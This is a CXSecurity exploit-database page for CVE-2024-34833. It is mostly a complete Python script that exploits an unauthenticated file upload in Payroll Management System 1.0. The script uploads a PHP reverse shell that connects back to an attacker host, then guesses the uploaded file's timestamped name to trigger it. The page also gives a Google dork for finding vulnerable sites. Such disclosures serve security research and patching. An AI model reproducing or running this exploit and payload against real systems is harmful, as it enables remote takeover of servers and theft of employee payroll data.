---
title: Payroll Management System 1.0 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024060060
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-25
fetch_date: 2025-10-06T16:54:35.102478
---

# Payroll Management System 1.0 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Payroll Management System 1.0 Remote Code Execution** **2024.06.24**  Credit:  **[ShellUnease](https://cxsecurity.com/author/ShellUnease/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-34833](https://cxsecurity.com/cveshow/CVE-2024-34833/ "Click to see CVE-2024-34833")**  CWE: **N/A**  **[**Dork:** intitle:"Employee's Payroll Management System"](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Payroll Management System v1.0 RCE (Unauthenticated)
# Google Dork: intitle:"Employee's Payroll Management System"
# Date: 16/06/2024
# Exploit Author: ShellUnease
# Vendor Homepage: https://www.sourcecodester.com/
# Software Link: https://www.sourcecodester.com/php/14475/payroll-management-system-using-phpmysql-source-code.html
# Version: v1.0
# Tested on: Kali Linux Apache Web Server
# CVE : CVE-2024-34833
#!/usr/bin/python
import argparse
import time
import requests
class Exploit:
def \_\_init\_\_(self, rhost, rport, lhost, lport, https):
self.rhost = rhost
self.rport = rport
self.lhost = lhost
self.lport = lport
self.targetUrl = f'https://{rhost}:{rport}' if https else f'http://{rhost}:{rport}'
self.banner()
def banner(self):
print("""
\_\_\_\_\_ \_ \_
| \_\_ \ | | |
| |\_\_) |\_ \_ \_ \_ \_ \_\_ \_\_\_ | | |
| \_\_\_/ \_` | | | | '\_\_/ \_ \| | |
| | | (\_| | |\_| | | | (\_) | | |
|\_| \_\\_\_,\_|\\_\_, |\_| \\_\_\_/|\_|\_| \_
| \/ | \_\_/ | | |
| \ / | \_\_ |\_\_\_/\_ \_\_ \_ \_\_ \_ \_\_\_ \_ \_\_ \_\_\_ \_\_\_ \_ \_\_ | |\_
| |\/| |/ \_` | '\_ \ / \_` |/ \_` |/ \_ \ '\_ ` \_ \ / \_ \ '\_ \| \_\_|
| | | | (\_| | | | | (\_| | (\_| | \_\_/ | | | | | \_\_/ | | | |\_
|\_|\_\_|\_|\\_\_,\_|\_| |\_|\\_\_,\_|\\_\_, |\\_\_\_|\_|\_|\_| |\_|\\_\_\_|\_|\_|\_|\\_\_|
/ \_\_\_\_| | | \_\_/ | | \_\_ \ / \_\_\_\_| \_\_\_\_|
| (\_\_\_ \_ \_ \_\_\_| |\_ \_\_\_ |\_\_\_/\_\_\_ | |\_\_) | | | |\_\_
\\_\_\_ \| | | / \_\_| \_\_/ \_ \ '\_ ` \_ \ | \_ /| | | \_\_|
\_\_\_\_) | |\_| \\_\_ \ || \_\_/ | | | | | | | \ \| |\_\_\_\_| |\_\_\_\_
|\_\_\_\_\_/ \\_\_, |\_\_\_/\\_\_\\_\_\_|\_| |\_| |\_| |\_| \\_\\\_\_\_\_\_|\_\_\_\_\_\_|
\_\_/ |
|\_\_\_/
""")
def get\_data(self):
return {
'name': 'John Doe',
'email': 'jdoe@gmail.com',
'contact': 'John Doe',
'about': 'John Doe',
}
def get\_payload(self):
return (f'<?php $sock=fsockopen("{self.lhost}",{self.lport});$proc=proc\_open("sh", array(0=>$sock, 1=>$sock, '
f'2=>$sock),$pipes); ?>')
def upload\_rev\_shell(self):
url = f'{self.targetUrl}/ajax.php?action=save\_settings'
print(f'Uploading a reverse shell via {url}')
requests.post(url, files={'img': ('a.php', self.get\_payload())},
data=self.get\_data())
epoch = time.time()
timestamp = epoch - (epoch % 60)
timestamp\_minus\_one\_min = timestamp - 60
timestamp\_plus\_one\_min = timestamp + 60
return [f'{int(timestamp)}\_a.php', f'{int(timestamp\_minus\_one\_min)}\_a.php',
f'{int(timestamp\_plus\_one\_min)}\_a.php']
def open\_rev\_shell(self, candidates):
print('Opening a reverse shell')
for candidate in candidates:
url = f'{self.targetUrl}/assets/img/{candidate}'
try:
requests.get(url).raise\_for\_status()
print(f'Got a success response for {url}, you should have a revshell')
return
except Exception as e:
print(f'Failed to open revshell using {url}')
print('Guessing filename failed')
def exploit(self):
candidates = self.upload\_rev\_shell()
self.open\_rev\_shell(candidates)
def get\_args():
parser = argparse.ArgumentParser(
description='Payroll Management System - Remote Code Execution (RCE) (Unauthenticated)')
parser.add\_argument('-rhost', '--remote-host', dest="rhost", required=True, action='store', help='Remote host')
parser.add\_argument('-rport', '--remote-port', dest="rport", required=False, action='store', help='Remote port',
default=80)
parser.add\_argument('-lhost', '--local-host', dest="lhost", required=True, action='store', help='Local host')
parser.add\_argument('-lport', '--local-port', dest="lport", required=True, action='store', help='Local port')
parser.add\_argument('-https', '--https', dest="https", required=False, action='store\_true', help='Use https')
args = parser.parse\_args()
return args
if \_\_name\_\_ == '\_\_main\_\_':
args = get\_args()
exp = Exploit(args.rhost, args.rport, args.lhost, args.lport, args.https)
exp.exploit()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060060)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 -1

0%

100%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top